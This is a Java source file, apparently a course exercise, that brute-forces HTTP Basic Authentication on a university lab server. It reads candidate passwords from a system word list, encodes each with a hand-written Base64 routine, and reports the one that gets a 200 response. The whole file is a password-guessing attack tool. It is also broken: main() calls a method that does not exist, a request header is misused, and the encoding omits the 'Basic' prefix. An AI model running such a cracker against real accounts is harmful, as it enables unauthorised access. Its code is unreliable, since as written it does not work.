import java.io.*;
import java.net.*;

public class Dictionary{

 public static void main( String[] args ){
 Dictionary dict= new Dictionary();
 dict.create();
 }

public void dsf(){
    String password;
    String auth_data;
    String username="";
    String server_res_code;
    String required_server_res_code="200";
    int cntr=0;
 try{
    URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
    URLConnection conn=null;
    String fileName = "/usr/share/lib/dict/words";
    fileName=fileName.trim();
    FileReader fr = new FileReader(fileName);
    BufferedReader inputfile = new BufferedReader(fr);

    while( (password=inputfile.readLine()) != null ){

           password = password.trim();
           
           auth_data=null;
           auth_data=username + ":" + password;
           auth_data=auth_data.trim();
           auth_data=getBasicAuthData(auth_data);
           auth_data=auth_data.trim();
           conn=url.openConnection();
           conn.setDoInput (true);
           conn.setDoOutput(true);
           conn.setRequestProperty("GET", "/SEC/2/ HTTP/1.1");
           conn.setRequestProperty ("Authorization", auth_data);
           server_res_code=conn.getHeaderField(0);
           server_res_code=server_res_code.substring(9,12);
           server_res_code.trim();
           cntr++;
           if( server_res_code.compareTo(required_server_res_code)!=0)
           System.out.println(cntr + " . " + "PASSWORD SEND : " + password + "  SERVER RESPONSE  : " + server_res_code);
           else {
           System.out.println(cntr + " . " + "PASSWORD IS: " + password + "  SERVER RESPONSE  : " + server_res_code);
           break;}

           }

}

catch( Exception e){
       System.err.println(e);
       }
}

public String getBasicAuthData (String getauthdata)    {

char base64Array [] = {
      'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
      'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
      'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
      'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
      'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
      'w', 'x', 'y', 'z', '0', '1', '2', '3',
      '4', '5', '6', '7', '8', '9', '+', '/' } ;

    String encodedString = "";
    byte bytes [] = getauthdata.getBytes ();
    int i = 0;
    int pad = 0;
    while (i < bytes.length) {
      byte b1 = bytes [i++];
      byte b2;
      byte b3;
      if (i >= bytes.length) {
         b2 = 0;
         b3 = 0;
         pad = 2;
         }
      else {
         b2 = bytes [i++];
         if (i >= bytes.length) {
            b3 = 0;
            pad = 1;
            }
         else
            b3 = bytes [i++];
         }
      byte c1 = (byte)(b1 >> 2);
      byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));
      byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));
      byte c4 = (byte)(b3 & 0x3f);
      encodedString += base64Array [c1];
      encodedString += base64Array [c2];
      switch (pad) {
       case 0:
         encodedString += base64Array [c3];
         encodedString += base64Array [c4];
         break;
       case 1:
         encodedString += base64Array [c3];
         encodedString += "=";
         break;
       case 2:
         encodedString += "==";
         break;
       }
      }
      return " " + encodedString;
  }

}